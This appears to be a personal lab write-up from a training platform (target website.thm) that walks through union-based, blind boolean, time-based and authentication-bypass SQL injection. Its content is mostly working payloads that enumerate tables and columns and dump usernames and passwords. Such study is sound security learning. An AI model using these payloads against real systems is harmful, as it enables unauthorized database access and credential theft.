# SQL Injection

> Shahrukh Tramboo | January 27th, 2022

--------------------------------------

**Union-Based SQL Injection (In-Band SQL Injection)**

Target;
https://website.thm/article?id=1

Task:
Get Martin's password

1.	The first thing we need to do is return data to the browser without displaying an error message.
Firstly we'll try the UNION operator so we can receive an extra result of our choosing.

```bash
1 UNION SELECT 1
```
This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query.

2.	So let's try again but add another column:

```bash
1 UNION SELECT 1,2
```
3.	Same error again, so let's repeat by adding another column:

```bash
1 UNION SELECT 1,2,3
```
Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article.

4.	To get around that, we need the first query to produce no results.

```bash
0 UNION SELECT 1,2,3
```

5.	We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
```bash
0 UNION SELECT 1,2,database()
```

6.	Our next query will gather a list of tables that are in this database.
```bash
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

7.	As the first level aims to discover Martin's password, the staff_users table is what is of interest to us.
```bash
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

8.	We can use the username and password columns for our following query to retrieve the user's information.
```bash
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

**Blind SQLi**

A.	Authentication Bypass:
```bash
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

can be bypassed if we put password as
```bash
' OR 1=1;--
```
which will make query as
```bash
select * from users where username='' and password='' OR 1=1;
```

----------------------------------------

B.	Boolean Based:

Target:
https://website.thm/checkuser?username=admin

Task:
Get username and password

Target query:
```bash
select * from users where username = '%username%' LIMIT 1;
```

1.	Our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement. Change the username value to the following:
```bash
admin123' UNION SELECT 1;--
```
As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true.

2.	You can confirm that the answer is three columns by setting the username to the below value:
```bash
admin123' UNION SELECT 1,2,3;-- 
```

3.	Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name.
```bash
admin123' UNION SELECT 1,2,3 where database() like '%';--
```
We get a true response because, in the like operator, we just have the value of %, which will match anything

4.	We can cycle through all the letters, numbers and characters such as - and _ until we discover a match.

```bash
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
```

5.	We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database.

```bash
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

6.	You'll finally end up discovering a table in the sqli_three database named users, which you can be confirmed by running the following username payload:
```bash
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

7.	Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials.
```bash
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

8.	Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one.
```bash
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

9.	Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials.
```bash
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

10.	Which, once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:
```bash
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
----------------------------------------------

C. Time Based:

The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
```bash
admin123' UNION SELECT SLEEP(5);--
```
If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```bash
admin123' UNION SELECT SLEEP(5),2;--
```
This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.

If you're struggling to find the table name the below query should help you on your way:
```bash
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```














